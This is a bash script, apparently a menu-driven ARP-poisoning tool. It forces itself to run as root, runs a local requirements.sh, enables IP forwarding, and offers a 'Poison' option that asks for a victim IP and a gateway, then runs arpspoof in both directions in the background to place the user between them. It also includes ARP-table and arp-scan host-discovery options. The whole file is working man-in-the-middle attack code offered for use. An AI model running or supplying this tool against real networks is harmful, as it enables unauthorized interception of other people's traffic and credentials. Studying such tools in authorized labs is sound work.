#!/usr/bin/bash

# Developed by HHY (noxterm version)

#font
bold=$(tput bold)
normal=$(tput sgr0)

#colors                                                                                        
NC='\033[0m'
Red='\033[0;91m'
Cyan='\033[0;96m'
Green='\033[0;92m'
Purple='\033[0;95m'

#loading animation
spinner() {
	local i sp n
	sp='/-\|'
	n=${#sp}
	printf ' '
	while sleep 0.1; do
		printf "%s\b" "${sp:i++%n:1}"
	done
}

#forcing running as root
root() {	 
	clear
	if [ "$EUID" -ne 0 ]
	then 
		echo -e "${Red}${bold}Not running as root...${NC}${normal}";
		echo "" ;
		sudo "$0" "$@"
		exit
	fi
}

#requirements
requirements() {
	echo -e "${Green}${bold}Checking the requirements...${NC}${normal}";
	spinner&
	sleep 3
	kill "$!"
	clear
	
	echo -e "${Green}${bold}Installing dependencies...${NC}${normal}";
	chmod +x ./requirements.sh
	# Run requirements directly in the current shell
	./requirements.sh

	echo -e "${Green}${bold}Enabling IP Forwarding...${NC}${normal}"; 
	# Robust IP forwarding enable
	echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

	spinner&
	sleep 3
	kill "$!"
}

#Print Net-Stats
netstats() {
	printf "${Purple}"
	echo -e "${bold}----[Net-Stats]----"
	echo
	sudo ip addr | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print iface" : "a[1] }'
	
	IP=$(/sbin/ip route | awk '/default/ { print $3 }' | head -n 1)
	echo "Default Gateway : $IP ${normal}"
	echo
}

backmenu() {
	read -r -p 'Press 1 to return to main menu...' responsecl
	case "$responsecl" in 
		([1]) clear; main ;;
		(* )
			echo "Invalid input... returning to main menu"
			sleep 2; clear; main
			;;
	esac
}

main() {
	chmod +x ./banner.sh
	./banner.sh
	netstats

	printf "${Purple}${bold}"
	PS3=': '
	options=("Poison" "Arp Table" "Hosts Scan" "Quit")
	select opt in "${options[@]}"
	do
		case $opt in
			"Poison")
				clear
				./banner.sh
				netstats
				printf "${Purple}${bold}"
				read -p 'Interface: ' inter
				read -p 'Victim IP: ' vict
				read -p 'Default Gateway: ' gate
				echo
				echo -e "${Red}${bold}Poisoning active in background.${NC}"
				echo -e "${Cyan}Press Ctrl+C to stop poisoning and return to menu.${normal}"
				
				# Run arpspoof in background (redirecting output to /dev/null to keep terminal clean)
				sudo arpspoof -i "$inter" -t "$vict" -r "$gate" > /dev/null 2>&1 &
				pid1=$!
				sudo arpspoof -i "$inter" -t "$gate" -r "$vict" > /dev/null 2>&1 &
				pid2=$!
				
				# Handle Ctrl+C to kill the background processes
				trap "sudo kill $pid1 $pid2; return" SIGINT
				
				wait $pid1 $pid2 2>/dev/null
				backmenu
			;;
			"Arp Table")
				clear
				./banner.sh
				netstats
				sudo arp -a 
				backmenu
			;;
			"Hosts Scan")
				clear
				./banner.sh
				netstats
				read -p 'Interface: ' scanint
				sudo arp-scan --interface="$scanint" --localnet
				backmenu
			;;
			"Quit") clear; exit ;;
			*) echo "Invalid option"; sleep 1; clear; main ;;
		esac
	done
}

root
requirements	   
clear
main
